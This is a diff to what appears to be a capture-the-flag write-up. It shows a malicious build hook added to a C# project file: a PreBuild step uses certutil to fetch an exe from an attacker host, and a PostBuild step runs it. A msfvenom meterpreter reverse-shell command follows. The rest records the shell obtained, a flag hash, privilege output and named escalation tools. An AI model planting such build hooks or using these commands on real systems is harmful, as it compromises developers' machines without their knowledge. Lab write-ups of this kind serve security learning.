@@ -106,6 +106,15 @@ namespace Program
  }
 }
 
+and i need to add PreBuild and PostBuild event to Repo.ConsoleApp.csproj:
+    <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+  <Exec Command="certutil -urlcache -f <ip>/<file>.exe %temp%/s.exe" />
+</Target>
+
+<Target Name="PostBuild" AfterTargets="PostBuildEvent">
+  <Exec Command="start %temp%/s.exe" />
+</Target>
+
 now we need to create reverse shell payload via msfvenom:
     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o s.exe
 
@@ -114,4 +123,26 @@ now we need to open python3 server using:
 
 [registries.search]
 registries = ['docker.io', 'quay.io']
+
+repo http://10.10.16.125/gituser/New
+
+i got the shell
+
+in :\Users\enox\Desktop a userflag:
+    d7529a8c7a9b0d4935463d3b518e6e0e
+
+
+c:\Users\enox\Desktop>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+to escalate my privileges im gonna need to use FullPower(https://github.com/itm4n/FullPowers) and PotatoGod(https://github.com/BeichenDream/GodPotato) tools
 
